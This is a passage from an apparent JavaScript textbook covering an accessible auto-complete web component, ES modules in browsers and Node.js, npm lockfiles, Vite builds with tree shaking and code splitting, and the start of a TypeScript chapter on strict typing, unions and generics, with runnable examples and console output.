    this.#input.addEventListener("keydown", (e) => this.#key(e));
    this.#input.addEventListener("blur", () => this.#close());
    this.#list.addEventListener("pointerdown", (e) => {      // pointerdown fires before the input's blur
      const li = e.target.closest("li");
      if (li) { e.preventDefault(); this.#choose(Number(li.dataset.index)); }
    });
    this.#setValue("");
  }

  get value() { return this.#internals.form ? new FormData(this.#internals.form).get(this.getAttribute("name")) : this.#input.value; }
  formResetCallback() { this.#input.value = ""; this.#setValue(""); }

  #setValue(v) {
    this.#internals.setFormValue(v);
    if (this.hasAttribute("required"))
      this.#internals.setValidity(v ? {} : { valueMissing: true }, "Choose an option from the list.", this.#input);
  }

  #filter() {
    const q = fold(this.#input.value.trim());
    this.#matches = q ? this.#options.filter((o) => fold(o).includes(q)).slice(0, 8) : [];
    this.#active = -1;
    this.#setValue("");                                  // free text is not a value until an option is chosen
    this.#render();
  }

  #render() {
    this.#list.replaceChildren(...this.#matches.map((text, i) => {
      const li = document.createElement("li");
      Object.assign(li, { id: `${this.#id}-${i}`, textContent: text });
      li.setAttribute("role", "option");
      li.setAttribute("aria-selected", String(i === this.#active));
      li.dataset.index = i;
      return li;
    }));
    const open = this.#matches.length > 0;
    this.#list.hidden = !open;
    this.#input.setAttribute("aria-expanded", String(open));
    if (this.#active >= 0) this.#input.setAttribute("aria-activedescendant", `${this.#id}-${this.#active}`);
    else this.#input.removeAttribute("aria-activedescendant");
  }

  #key(e) {
    const n = this.#matches.length;
    if (e.key === "ArrowDown" && n) { this.#active = (this.#active + 1) % n; this.#render(); e.preventDefault(); }
    else if (e.key === "ArrowUp" && n) { this.#active = (this.#active - 1 + n) % n; this.#render(); e.preventDefault(); }
    else if (e.key === "Enter" && this.#active >= 0) { this.#choose(this.#active); e.preventDefault(); }
    else if (e.key === "Escape") this.#close();
  }

  #choose(i) {
    const value = this.#matches[i];
    this.#input.value = value;
    this.#setValue(value);
    this.#close();
    this.dispatchEvent(new Event("change", { bubbles: true }));
  }

  #close() { this.#matches = []; this.#active = -1; this.#render(); }
}
customElements.define("auto-complete", AutoComplete);
```

```html
<!-- file: project/demo.html -->
<!DOCTYPE html>
<html lang="en">
<head><meta charset="utf-8"><title>auto-complete</title></head>
<body>
  <form id="f">
    <auto-complete name="country" label="Country" required>
      <option>Austria</option><option>Österreich (Austria)</option><option>Germany</option>
      <option>Georgia</option><option>Ghana</option><option>Niger</option><option>Nigeria</option>
    </auto-complete>
    <button>Send</button>
  </form>
  <script src="auto-complete.js"></script>
  <script>
    const form = document.getElementById("f");
    form.addEventListener("submit", (e) => {
      e.preventDefault();
      console.log(`submitted: ${JSON.stringify(Object.fromEntries(new FormData(form)))}`);
    });
    form.addEventListener("invalid", (e) => console.log(`invalid: ${e.target.localName}`), true);
    document.querySelector("auto-complete").addEventListener("change", (e) => console.log(`change: ${e.target.value}`));
  </script>
</body>
</html>
```

```console
$ cd project && python3 ../../tools/page.py demo.html "click:button"
invalid: auto-complete
$ cd project && python3 ../../tools/page.py demo.html "click:auto-complete" "press:g" "press:e" "aria:auto-complete" press:ArrowDown press:ArrowDown "eval:document.querySelector('auto-complete').shadowRoot.querySelector('input').getAttribute('aria-activedescendant')" press:Enter "click:button"
- text: Country
- combobox "Country" [expanded]: ge
- listbox:
  - option "Germany"
  - option "Georgia"
  - option "Niger"
  - option "Nigeria"
=> "ac1-1"
change: Georgia
submitted: {"country":"Georgia"}
$ cd project && python3 ../../tools/page.py demo.html "fill:auto-complete input|oster" "aria:auto-complete" press:ArrowDown press:Enter "click:button" "eval:document.getElementById('f').reset()" "click:button"
- text: Country
- combobox "Country" [expanded]: oster
- listbox:
  - option "Österreich (Austria)"
change: Österreich (Austria)
submitted: {"country":"Österreich (Austria)"}
=> null
invalid: auto-complete
```

Submitting empty fails validation — the browser treats the custom element exactly like a required native input. Typing "ge" opens a listbox of four matches (the accessibility tree shows the combobox as expanded); two presses of Arrow Down make the second option active, announced through `aria-activedescendant` while focus stays in the input; Enter chooses it and the form submits `country=Georgia`. "oster" matches "Österreich" through Unicode normalisation, and `reset()` clears the value so that validation fails again.

### Deep & Tricky

**DT-29. `aria-activedescendant` and `aria-controls` refer to elements by `id`, and IDs are scoped to their tree: an input in the light DOM cannot point at an option inside a shadow root (or the reverse), because the reference simply does not resolve across the boundary. That is why the component keeps the input and the listbox in the *same* shadow root; cross-root ARIA references are still being standardised ("reference target").** *(WAI-ARIA 1.2 §6.2 ID reference properties; DOM Standard §4.2.2 — `getElementById` and ID references are tree-scoped; WICG "Reference Target for Cross-Root ARIA" proposal)*

### Review checklist

- Screen readers should hear how many suggestions there are. Add a visually hidden live region that announces "4 suggestions".
- Mouse selection uses `pointerdown` with `preventDefault` so the input does not blur first. What breaks if you use `click`?
- Add `Home`/`End` keys and highlighting of the matched text without using `innerHTML`.

## Answers to the Chapter 8 prediction questions

**Unit 8.2, Q1.** `<input value="x">` — the attribute is unchanged; the typed text lives only in the `value` property.

**Unit 8.4, Q1.** For a non-passive listener the browser must wait for it to finish before scrolling, in case it calls `preventDefault`; a passive listener promises not to, so scrolling can start immediately on the compositor thread.

**Unit 8.7, Q1.** So that they can never clash with current or future built-in HTML elements, which never contain a hyphen; the hyphen also tells the parser the element may be upgraded later.

# Chapter 9 — Modules, npm, and Build Tools

*Goal: organise JavaScript into modules and ship it efficiently. You will see how ES modules load in the browser (and why they refuse to load from `file://`), how live bindings and single evaluation work, how Node.js mixes ES modules with the older CommonJS system, what `package.json`'s `exports` field enforces, how npm resolves and locks dependencies, and what a build tool such as Vite does — dev server, bundling, hashing, code splitting, and tree shaking — measured on a real build.*

**What you will be able to do after this chapter**

- Write and load ES modules in browsers, with import maps and dynamic `import()`.
- Explain live bindings, module evaluation order, and why modules need HTTP.
- Combine ES modules and CommonJS in Node.js, and publish a package with an `exports` map.
- Manage dependencies with npm: semantic versioning, lockfiles, and `npx`.
- Build an app with Vite and verify hashing, code splitting, and tree shaking.

## Topic 9A — ES modules

## Unit 9.1 — Modules in the browser

**One-line summary:** A `<script type="module">` is deferred, strict, has its own top-level scope (where `this` is `undefined`), may use top-level `await`, and loads its imports over HTTP with CORS rules; each module is evaluated once however often it is imported, and exports are *live bindings* — importers see later changes to an exported variable, but cannot assign to it.

```js
// file: esm/counter.js
export let count = 0;                                // a live binding: importers see changes
export function increment() { count++; }
console.log("counter.js evaluated (once, however many times it is imported)");
```

```js
// file: esm/a.js
import { count, increment } from "./counter.js";
increment();
console.log(`a.js: count is ${count} after increment`);
```

```js
// file: esm/b.js
import { count, increment } from "./counter.js";
import * as counter from "./counter.js";
increment();
console.log(`b.js: count is ${count}`);
try { count = 100; } catch (e) { console.log(`b.js: count = 100 -> ${e.name}: ${e.message}`); }
try { counter.count = 100; } catch (e) { console.log(`b.js: counter.count = 100 -> ${e.name}`); }
```

```js
// file: esm/lib/text.js
export const shout = (s) => s.toUpperCase() + "!";
```

```js
// file: esm/lazy.js
export default function lazy() { return "lazy.js was fetched only when import() ran"; }
```

```html
<!-- file: esm/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>ES modules in the browser</title>
  <script type="importmap">
    { "imports": { "utils/": "./lib/" } }
  </script>
  <script type="module" src="a.js"></script>
  <script type="module" src="b.js"></script>
  <script type="module">
    import { shout } from "utils/text.js";             // a bare specifier, resolved by the import map
    console.log(shout("inline module"), `| this at top level: ${this}`);
    const { default: lazy } = await import("./lazy.js");   // top-level await and dynamic import
    console.log(lazy());
  </script>
  <script>console.log("classic script in the head runs first: modules are deferred");</script>
</head>
<body></body>
</html>
```

Opened straight from disk, nothing works:

```console
$ cd esm && python3 ../../tools/page.py index.html
Access to script at 'file://esm/a.js' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: chrome, chrome-untrusted, data, http, https.
Failed to load resource: net::ERR_FAILED
classic script in the head runs first: modules are deferred
Access to script at 'file://esm/b.js' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: chrome, chrome-untrusted, data, http, https.
Failed to load resource: net::ERR_FAILED
Access to script at 'file://esm/lib/text.js' from origin 'null' has been blocked by CORS policy: Cross origin requests are only supported for protocol schemes: chrome, chrome-untrusted, data, http, https.
Failed to load resource: net::ERR_FAILED
```

Served over HTTP by the Chapter 0 server, with its request log:

```console
$ cd esm && python3 ../../tools/page.py http://localhost:8085/index.html --serve "node ../../ch00/project/static.mjs . 8085" --server-log
serving esm/ on http://localhost:8085/
HEAD /index.html -> 200
GET /index.html -> 200
classic script in the head runs first: modules are deferred
GET /b.js -> 200
GET /a.js -> 200
GET /lib/text.js -> 200
GET /counter.js -> 200
counter.js evaluated (once, however many times it is imported)
a.js: count is 1 after increment
b.js: count is 2
b.js: count = 100 -> TypeError: Assignment to constant variable.
GET /lazy.js -> 200
b.js: counter.count = 100 -> TypeError
INLINE MODULE! | this at top level: undefined
lazy.js was fetched only when import() ran
```

The classic script runs first, because module scripts are deferred. `counter.js` is fetched and evaluated once, although two modules import it, and `b.js` sees the count that `a.js` changed — a live binding, not a copy. Imports are read-only from the importer's side. The import map resolves the bare specifier `utils/text.js`, and `lazy.js` is requested only when `import()` runs.

### Deep & Tricky

**DT-30. Module scripts are always fetched in CORS mode, and Chromium treats `file://` URLs as having an opaque origin, so a page opened from disk cannot load any module — not even one in the same folder; the same page works over `http://localhost`. Every module page in this book is therefore served, and a module served with the wrong `Content-Type` (anything but a JavaScript MIME type) is also refused, which static file servers that default to `application/octet-stream` get wrong.** *(HTML Living Standard §8.1.4.2 "Fetching scripts": module scripts use CORS mode "cors"; §8.1.4.1 — the response's MIME type must be a JavaScript MIME type; Chromium security policy for `file:` origins)*

### Mastery check

1. **Predict.** Two different pages import `./counter.js`. Do they share the counter?

## Unit 9.2 — Modules in Node.js

**One-line summary:** Node.js has two module systems: CommonJS (`require`, `module.exports`, synchronous, the historical default for `.js`) and ES modules (`import`/`export`, used for `.mjs` files and for `.js` files in a package with `"type": "module"`); ES modules can import CommonJS, recent Node versions can `require()` ES modules without top-level await, and a package's `exports` field defines exactly which files outsiders may import.

The two small packages need `package.json` files, created here with one-line commands (JSON cannot contain the book's file-name comment):

```js
// file: node/cjs-lib/index.js
// CommonJS: require() and module.exports, loaded synchronously.
exports.version = "1.0";
exports.add = (a, b) => a + b;
console.log(`cjs-lib loaded; __filename ends with ${__filename.split("/").slice(-2).join("/")}`);
```

```js
// file: node/esm-lib/index.js
export const version = "2.0";
export default function hello(name) { return `hello ${name}`; }
```

```js
// file: node/esm-lib/math.js
export const square = (x) => x * x;
```

```js
// file: node/esm-lib/internal.js
export const secret = 42;
```

```js
// file: node/main.mjs
// An ES module using both kinds of package.
import cjs from "./cjs-lib/index.js";                       // CommonJS: module.exports becomes the default export
import { add } from "./cjs-lib/index.js";                   // named exports detected by static analysis
import hello, { version } from "./esm-lib/index.js";
console.log(cjs.version, add(2, 3), hello("esm"), version);
console.log(`import.meta.url ends with ${import.meta.url.split("/").pop()}; ` +
            `import.meta.dirname ends with ${import.meta.dirname.split("/").pop()}`);
```

```js
// file: node/main.cjs
// A CommonJS module requiring an ES module (supported without flags since Node 22.12).
const { square } = require("./esm-lib/math.js");
const lib = require("./cjs-lib/index.js");
const again = require("./cjs-lib/index.js");               // cached: not evaluated twice
console.log(square(7), lib.add(1, 1), lib === again);
```

```console
$ cd node && echo '{ "name": "cjs-lib", "version": "1.0.0", "main": "index.js" }' > cjs-lib/package.json
$ cd node && echo '{ "name": "esm-lib", "version": "2.0.0", "type": "module", "exports": { ".": "./index.js", "./math": "./math.js" } }' > esm-lib/package.json
$ cd node && node main.mjs
cjs-lib loaded; __filename ends with cjs-lib/index.js
1.0 5 hello esm 2.0
import.meta.url ends with main.mjs; import.meta.dirname ends with node
$ cd node && node main.cjs
cjs-lib loaded; __filename ends with cjs-lib/index.js
49 2 true
```

From an ES module, a CommonJS module's `module.exports` is the default import, and its named exports are available when Node can detect them statically. In the CommonJS program, `require` returned the same cached object twice. ES modules have no `__filename`; `import.meta.url` and `import.meta.dirname` replace it.

When the ES package is installed in `node_modules`, its `exports` map is enforced:

```js
// file: node/app/use.mjs
// A package's "exports" field is its public surface: other files cannot be imported.
import { square } from "esm-lib/math";
console.log("esm-lib/math:", square(3));
try { await import("esm-lib/internal.js"); }
catch (e) { console.log(`esm-lib/internal.js: ${e.code}`); }
```

```console
$ cd node && mkdir -p app/node_modules && cp -r esm-lib app/node_modules/ && cd app && node use.mjs
esm-lib/math: 9
esm-lib/internal.js: ERR_PACKAGE_PATH_NOT_EXPORTED
```

### Deep & Tricky

**DT-31. The "dual package hazard": a package that ships both a CommonJS and an ES module build can be loaded *twice* in one program — once through `require` and once through `import` — giving two copies of its module state, so an `instanceof` check fails across them and a singleton (a cache, a registry) exists twice. Shipping one format (ES modules, now that `require(esm)` works) avoids the hazard.** *(Node.js documentation, "Packages — Dual package hazard"; Node.js 22.12 release notes, `require(esm)` enabled by default)*

### Mastery check

1. **Predict.** In a folder whose `package.json` has `"type": "module"`, can a file named `old.cjs` use `require`?

## Topic 9B — Packages and builds

## Unit 9.3 — npm, semantic versioning, and lockfiles

**One-line summary:** `package.json` lists a project's dependencies with version *ranges* — `^8.3.8` allows any 8.x.y at or above 8.3.8, `~8.3.8` allows 8.3.x, an exact version allows only itself — and `npm install` resolves those ranges to exact versions recorded in `package-lock.json`, which must be committed so that every machine installs the same tree (`npm ci` installs exactly the lockfile).

Semantic versioning promises MAJOR.MINOR.PATCH: breaking changes raise MAJOR, new features MINOR, fixes PATCH — a promise made by people, which is why lockfiles exist. The project below is created with npm:

```console
$ cd shop && npm init -y > /dev/null && npm pkg set name=shop type=module scripts.dev=vite "scripts.build=vite build" "scripts.preview=vite preview" && npm pkg set private=true --json && npm pkg delete main scripts.test keywords author license description
$ cd shop && npm install --save-dev vite@8 2>&1 | tail -1 && cat package.json && npm ls --depth=0
found 0 vulnerabilities
{
  "name": "shop",
  "version": "1.0.0",
  "scripts": {
    "dev": "vite",
    "build": "vite build",
    "preview": "vite preview"
  },
  "type": "module",
  "private": true,
  "devDependencies": {
    "vite": "^8.3.8"
  }
}
shop@1.0.0 shop
└── vite@8.3.8
$ cd shop && du -sh node_modules && ls node_modules | wc -l
35M	node_modules
17
```

`devDependencies` are tools needed to build and test, not to run the result; `private: true` prevents accidental publication. Vite itself has few dependencies, but they still occupy tens of megabytes; every package in the tree runs code on your machine at install or build time, which is why supply-chain attacks target npm (Chapter 14).

## Unit 9.4 — What a build tool does

**One-line summary:** In development, Vite serves source files as native ES modules and transforms them on request (fast start, instant updates); for production, it bundles the modules into a few files, removes unused exports (tree shaking), splits dynamically imported code into separate chunks, extracts CSS, minifies, and gives every file a name containing a hash of its content, so it can be cached forever (Chapter 0, Unit 0.3).

```html
<!-- file: shop/index.html -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>Shop</title>
  <script type="module" src="/src/main.js"></script>
</head>
<body>
  <h1>Shop</h1>
  <p id="total"></p>
  <button id="stats">Show statistics</button>
  <pre id="out"></pre>
</body>
</html>
```

```js
// file: shop/src/main.js
import "./style.css";                                    // CSS is a module too: Vite injects or extracts it
import { formatPrice } from "./money.js";                // only formatPrice is used ...

const cart = [1999, 2499, 999];
document.getElementById("total").textContent = `Total: ${formatPrice(cart.reduce((a, b) => a + b))}`;
console.log(`main.js running in ${import.meta.env.MODE} mode`);

document.getElementById("stats").addEventListener("click", async () => {
  const { summarize } = await import("./pages/stats.js");    // a separate chunk, loaded on demand
  document.getElementById("out").textContent = summarize(cart);
  console.log("stats chunk loaded and run");
});
```

```js
// file: shop/src/money.js
export const formatPrice = (cents) =>
  new Intl.NumberFormat("en-US", { style: "currency", currency: "USD" }).format(cents / 100);

export function convertCurrencyWithLiveRates(cents) {    // ... so this is never shipped (tree shaking)
  return `UNUSED_EXPORT_MARKER ${cents}`;
}
```

```js
// file: shop/src/pages/stats.js
export function summarize(values) {
  const sum = values.reduce((a, b) => a + b, 0);
  return `items ${values.length}, mean ${(sum / values.length / 100).toFixed(2)}, max ${Math.max(...values) / 100}`;
}
```

```css
/* file: shop/src/style.css */
body { font-family: system-ui, sans-serif; margin: 2rem; }
#total { font-weight: bold; }
```

```console
$ cd shop && npx vite build 2>&1 | grep -E "dist/|built"
dist/index.html                 0.37 kB │ gzip: 0.25 kB
dist/assets/index-CGz1v0lr.css  0.07 kB │ gzip: 0.09 kB
dist/assets/stats-CutvAAbq.js   0.15 kB │ gzip: 0.14 kB
dist/assets/index-sRQ_tEbp.js   2.78 kB │ gzip: 1.33 kB
✓ built in 55ms
$ cd shop && (grep -rl UNUSED_EXPORT_MARKER dist || echo "the unused export is not in the build") && grep -c "summarize" dist/assets/*.js
the unused export is not in the build
dist/assets/index-sRQ_tEbp.js:1
dist/assets/stats-CutvAAbq.js:1
```

The build produced one entry chunk, one CSS file, and a separate `stats` chunk; every name contains a content hash. The unused export is gone. (The entry chunk mentions `summarize` too: it contains the code that loads the stats chunk and reads that export from it.) Served by the Chapter 0 server, the stats chunk is fetched only when the button is clicked:

```console
$ cd shop && python3 ../../tools/page.py http://localhost:8086/ click:#stats wait:300 "eval:document.getElementById('out').textContent" --serve "node ../../ch00/project/static.mjs dist 8086" --server-log
serving dist/ on http://localhost:8086/
HEAD / -> 200
GET / -> 200
GET /assets/index-sRQ_tEbp.js -> 200
GET /assets/index-CGz1v0lr.css -> 200
main.js running in production mode
GET /assets/stats-CutvAAbq.js -> 200
stats chunk loaded and run
=> "items 3, mean 18.32, max 24.99"
```

In development, the same page loads the *source* modules one by one, plus Vite's client, which connects to the dev server to replace modules when files change (hot module replacement):

```console
$ cd shop && python3 ../../tools/page.py http://localhost:5173/ "eval:performance.getEntriesByType('resource').map((r) => new URL(r.name).pathname)" --serve "npx vite --port 5173 --strictPort"
[vite] connecting...
main.js running in development mode
[vite] connected.
=> ["/@vite/client", "/src/main.js", "/src/style.css", "/src/money.js", "/node_modules/vite/dist/client/env.mjs"]
```

### Deep & Tricky

**DT-32. Tree shaking can remove an unused export only if the bundler can prove that evaluating the module has no other effects: top-level code that does anything — registers a global, patches a prototype, or merely calls a function the bundler cannot see into — keeps the module, and sometimes the whole library, in the bundle. Libraries declare their modules effect-free with `"sideEffects": false` in `package.json`, and `/*#__PURE__*/` annotations mark individual calls; CommonJS modules generally cannot be tree-shaken at all.** *(Rollup documentation, "Tree-shaking" and `treeshake.moduleSideEffects`; webpack documentation, "Tree Shaking — Mark the file as side-effect-free")*

### Pattern

**P-9. Commit the lockfile, install with `npm ci` in automation, keep build output out of version control, and serve hashed assets with `Cache-Control: max-age=31536000, immutable` and the HTML with `no-cache`.** *(npm documentation, "package-lock.json" and "npm ci"; web.dev, "Love your cache")* *Trade-off:* a lockfile pins vulnerable versions too; pair it with automated update tools (Dependabot, Renovate) and `npm audit` so pinned versions do not rot.

## Chapter 9 Project — Verify a production build

### Requirements

Use the `shop` app above as the project. Write a script that checks a production build automatically, so that a mistake in the build configuration fails loudly:

- every file under `dist/assets` has a content hash in its name;
- `index.html` references only hashed assets, and all of them exist;
- the stats page is a separate chunk that `index.html` does not load directly;
- the marker of the unused export is absent;
- the total JavaScript is under a size budget (5 kB).

### Reference solution

```js
// file: shop/check-build.mjs
import { readdir, readFile, stat } from "node:fs/promises";

const assets = await readdir("dist/assets");
const html = await readFile("dist/index.html", "utf8");
const referenced = [...html.matchAll(/(?:src|href)="\/assets\/([^"]+)"/g)].map((m) => m[1]);
let jsBytes = 0, failures = 0;
for (const f of assets) if (f.endsWith(".js")) jsBytes += (await stat(`dist/assets/${f}`)).size;
const allText = (await Promise.all(assets.map((f) => readFile(`dist/assets/${f}`, "utf8")))).join("");

const checks = {
  "every asset name contains a hash": assets.every((f) => /-[\w-]{8}\.\w+$/.test(f)),
  "index.html references only existing assets": referenced.length > 0 && referenced.every((f) => assets.includes(f)),
  "stats is a separate chunk, not loaded by index.html": assets.some((f) => f.startsWith("stats-")) && !referenced.some((f) => f.startsWith("stats-")),
  "unused export removed": !allText.includes("UNUSED_EXPORT_MARKER"),
  [`JavaScript under 5 kB (${jsBytes} bytes)`]: jsBytes < 5000,
};
for (const [name, ok] of Object.entries(checks)) { console.log(`${ok ? "PASS" : "FAIL"}  ${name}`); failures += !ok; }
process.exitCode = failures ? 1 : 0;
```

```console
$ cd shop && node check-build.mjs
PASS  every asset name contains a hash
PASS  index.html references only existing assets
PASS  stats is a separate chunk, not loaded by index.html
PASS  unused export removed
PASS  JavaScript under 5 kB (2936 bytes)
```

Wire it into `package.json` as `"postbuild": "node check-build.mjs"`, and every `npm run build` verifies itself; in continuous integration, the non-zero exit code fails the pipeline.

### Review checklist

- Change `main.js` to `import * as money from "./money.js"` and use `money.formatPrice`. Is the unused export still removed?
- Add a large library (for example a date library) to the stats page only. Which chunk grows?
- What should the server send for `index.html` and for `/assets/*`? Change Chapter 0's server to do it.

## Answers to the Chapter 9 prediction questions

**Unit 9.1, Q1.** No: module instances live per realm (per page, worker, or iframe); each page evaluates its own copy.

**Unit 9.2, Q1.** Yes: the `.cjs` extension always means CommonJS, whatever the `type` field says (and `.mjs` always means ES module).

# Chapter 10 — TypeScript

*Goal: add a static type system to JavaScript and know exactly what it does and does not guarantee. TypeScript checks your program before it runs and then disappears: the code that runs is plain JavaScript. This chapter sets up the compiler (TypeScript 7, the native rewrite) and Node.js's built-in type stripping, then covers unions and narrowing, structural object types, generics and utility types, and computing with types; it is honest about the holes — assertions, `any`, and the erasure of all types at run time — and the project closes the most important hole: validating untrusted data with schemas that produce their own static types.*

**What you will be able to do after this chapter**

- Configure a strict TypeScript project and run `.ts` files directly with Node.js.
- Model data with unions, discriminated unions, and exhaustive checks.
- Write generic functions with constraints, and use utility and mapped types.
- Recognise unsound constructs (`as`, `any`, `!`, covariance) and avoid relying on them.
- Validate external data at run time and derive the static types from the validators.

## Topic 10A — Setting up

## Unit 10.1 — The compiler, strict mode, and type stripping

**One-line summary:** `tsc` type-checks `.ts` files according to `tsconfig.json` (always use `"strict": true`), reporting errors with file, line, and column; it can also emit JavaScript, but modern tools mostly just *strip* the types — Node.js 22.18 and later run `.ts` files directly when they use only erasable syntax (no `enum`, `namespace`, or parameter properties).

```console
$ npm init -y > /dev/null && npm pkg set type=module && npm install --save-dev typescript@7 2>&1 | tail -1 && npx tsc --version
found 0 vulnerabilities
Version 7.0.2
$ for d in basics generics advanced project; do mkdir -p $d && echo "{ \"compilerOptions\": { \"strict\": true, \"noEmit\": true, \"target\": \"es2024\", \"module\": \"nodenext\", \"erasableSyntaxOnly\": true, \"noUncheckedIndexedAccess\": true, \"allowImportingTsExtensions\": true } }" > $d/tsconfig.json; done
```

The options: `strict` turns on every soundness check (`strictNullChecks` above all); `noEmit` makes `tsc` a pure checker; `erasableSyntaxOnly` rejects TypeScript features that need code generation, so that type stripping is always enough; `noUncheckedIndexedAccess` makes `array[i]` and `record[key]` include `undefined`, as they can at run time; `allowImportingTsExtensions` lets imports name `.ts` files, as Node requires.

```ts
// file: basics/errors.ts
// Bugs that the type checker reports before the code ever runs.
interface User { id: number; name: string; email?: string }

function greet(user: User) {
  return `Hello ${user.name.toUpperCase()}, we will write to ${user.email.toLowerCase()}`;
}
const u: User = { id: 1, name: "Ana", emial: "ana@example.com" };
greet({ id: "2", name: "Bo" });
const ids = [1, 2, 3];
const first: number = ids.find((id) => id > 1);
type Status = "active" | "suspended";
const s: Status = "Active";
```

```console
$ npx tsc -p basics
basics/errors.ts(6,64): error TS18048: 'user.email' is possibly 'undefined'.
basics/errors.ts(8,39): error TS2561: Object literal may only specify known properties, but 'emial' does not exist in type 'User'. Did you mean to write 'email'?
basics/errors.ts(9,9): error TS2322: Type 'string' is not assignable to type 'number'.
basics/errors.ts(11,7): error TS2322: Type 'number | undefined' is not assignable to type 'number'.
  Type 'undefined' is not assignable to type 'number'.
basics/errors.ts(13,7): error TS2820: Type '"Active"' is not assignable to type 'Status'. Did you mean '"active"'?
```

Five bugs, none of which would be reported by JavaScript until the wrong line ran: a possibly missing optional field, a misspelt property (with a suggestion), a string where a number belongs, `find`'s possibly-undefined result, and a wrong-case string literal.

### Mastery check

1. **Explain.** Why can Node.js run `const x: number = 1` without the TypeScript compiler, but not `enum Color { Red }`?

## Topic 10B — Types for data

## Unit 10.2 — Unions and narrowing

**One-line summary:** A union type (`A | B`) says a value is one of several types; TypeScript *narrows* it through `typeof`, `instanceof`, `Array.isArray`, `in`, equality checks, and — best of all — a common literal property (a discriminated union), and the `never` type turns "I handled every case" into a compile-time check.

```ts
// file: basics/narrow.ts
// Union types and narrowing: TypeScript follows your checks through the control flow.
type Shape =
  | { kind: "circle"; radius: number }
  | { kind: "rect"; width: number; height: number }
  | { kind: "triangle"; base: number; height: number };   // a discriminated union: "kind" tells them apart

function area(s: Shape): number {
  switch (s.kind) {
    case "circle": return Math.PI * s.radius ** 2;          // here s is the circle variant
    case "rect": return s.width * s.height;
    case "triangle": return (s.base * s.height) / 2;
    default: {
      const unreachable: never = s;                         // compile error if a variant is unhandled
      return unreachable;
    }
  }
}

function describe(x: string | number | string[] | null): string {
  if (x === null) return "nothing";
  if (typeof x === "number") return `number ${x.toFixed(1)}`;   // x: number
  if (Array.isArray(x)) return `list of ${x.length}`;           // x: string[]
  return `text "${x.toUpperCase()}"`;                            // x: string
}

const shapes: Shape[] = [{ kind: "circle", radius: 1 }, { kind: "rect", width: 2, height: 3 }];
console.log(shapes.map(area).map((a) => a.toFixed(2)), describe(3.14159), describe(["a"]), describe("hi"), describe(null));
```

```console
$ node basics/narrow.ts
[ '3.14', '6.00' ] number 3.1 list of 1 text "HI" nothing
```

Inside each `case`, `s` has the properties of that variant only; `s.radius` in the `rect` case would not compile. If someone adds a fourth shape, the assignment to `never` fails to compile until `area` handles it — a whole class of "forgot to update the switch" bugs disappears.

## Unit 10.3 — Generics and utility types

**One-line summary:** Generic functions and types take type parameters (`<T>`), inferred from the arguments, and constraints (`K extends keyof T`) tie parameters together; built-in utility types (`Partial`, `Pick`, `Omit`, `Record`, `ReturnType`…) derive new types from existing ones, and `satisfies` checks a value against a type without widening it.

```ts
// file: generics/generics.ts
// Generics: functions and types parameterised by types, with constraints.
function firstOf<T>(items: readonly T[]): T | undefined { return items[0]; }
function pluck<T, K extends keyof T>(items: T[], key: K): T[K][] { return items.map((it) => it[key]); }
function groupBy<T, K extends PropertyKey>(items: T[], keyOf: (item: T) => K): Record<K, T[]> {
  const out = {} as Record<K, T[]>;
  for (const it of items) (out[keyOf(it)] ??= []).push(it);
  return out;
}

interface Product { sku: string; price: number; tags: string[] }
const products: Product[] = [
  { sku: "A1", price: 1999, tags: ["new"] }, { sku: "B2", price: 499, tags: [] }, { sku: "C3", price: 2999, tags: ["new"] },
];
const f = firstOf(products);                       // Product | undefined
const prices = pluck(products, "price");           // number[]
const byNew = groupBy(products, (p) => (p.tags.includes("new") ? "new" : "old"));   // Record<"new" | "old", Product[]>
console.log(f?.sku, prices, Object.keys(byNew), byNew.new.length);

// Utility types derive new types from existing ones
type ProductPatch = Partial<Omit<Product, "sku">>;            // every field except sku, all optional
type PriceList = Record<Product["sku"], number>;
type Summary = Pick<Product, "sku" | "price">;
const patch: ProductPatch = { price: 1799 };
const summary: Summary = { sku: "A1", price: 1999 };
const list: PriceList = { A1: 1999 };
console.log(patch, summary, list);

// satisfies checks a value against a type WITHOUT widening it to that type
const routes = { home: "/", product: "/p/:sku" } satisfies Record<string, `/${string}`>;
const r: "/p/:sku" = routes.product;                          // still the literal type
console.log(r);
```

```console
$ npx tsc -p generics && node generics/generics.ts
A1 [ 1999, 499, 2999 ] [ 'new', 'old' ] 2
{ price: 1799 } { sku: 'A1', price: 1999 } { A1: 1999 }
/p/:sku
```

`pluck(products, "price")` is typed `number[]` because `K` is the literal `"price"` and `T[K]` is `Product["price"]`; `pluck(products, "cost")` would not compile. With `satisfies`, `routes.product` keeps its exact type `"/p/:sku"`, where an annotation `const routes: Record<string, …>` would have widened it to `string`.

### Pattern

**P-10. Model state as discriminated unions rather than objects of optional fields — `{ status: "loading" } | { status: "error"; error: Error } | { status: "done"; data: T }` instead of `{ loading?: boolean; error?: Error; data?: T }` — so that impossible combinations cannot be represented.** *(Practice; "make illegal states unrepresentable", Yaron Minsky; TypeScript Handbook, "Discriminated Unions")* *Trade-off:* every reader must narrow before using a field, which is more code at each use site — that is the point.

## Unit 10.4 — Computing with types

**One-line summary:** Mapped types transform every property of a type (`{ [K in keyof T]: … }`, with `as` to rename keys), conditional types choose between types (`T extends U ? X : Y`, with `infer` to extract parts), and template literal types build string types — together a small functional language evaluated by the compiler, whose results can be tested with compile-time assertions.

```ts
// file: advanced/types.ts
// Computing with types: mapped, conditional, and template literal types. Checked by tsc only.
type Expect<T extends true> = T;                                  // compile-time assertions
type Equal<A, B> = (<T>() => T extends A ? 1 : 2) extends (<T>() => T extends B ? 1 : 2) ? true : false;

interface Settings { theme: "light" | "dark"; fontSize: number; beta: boolean }

type Getters<T> = { [K in keyof T as `get${Capitalize<string & K>}`]: () => T[K] };   // mapped + key remapping
type ReadonlyDeep<T> = { readonly [K in keyof T]: T[K] extends object ? ReadonlyDeep<T[K]> : T[K] };
type ElementOf<T> = T extends readonly (infer E)[] ? E : never;  // conditional type with infer
type EventName<T extends string> = `on${Capitalize<T>}`;         // template literal type
type NonFunctionKeys<T> = { [K in keyof T]: T[K] extends (...a: any[]) => any ? never : K }[keyof T];

type _tests = [
  Expect<Equal<keyof Getters<Settings>, "getTheme" | "getFontSize" | "getBeta">>,
  Expect<Equal<ReturnType<Getters<Settings>["getTheme"]>, "light" | "dark">>,
  Expect<Equal<ElementOf<string[]>, string>>,
  Expect<Equal<ElementOf<readonly [1, "a"]>, 1 | "a">>,
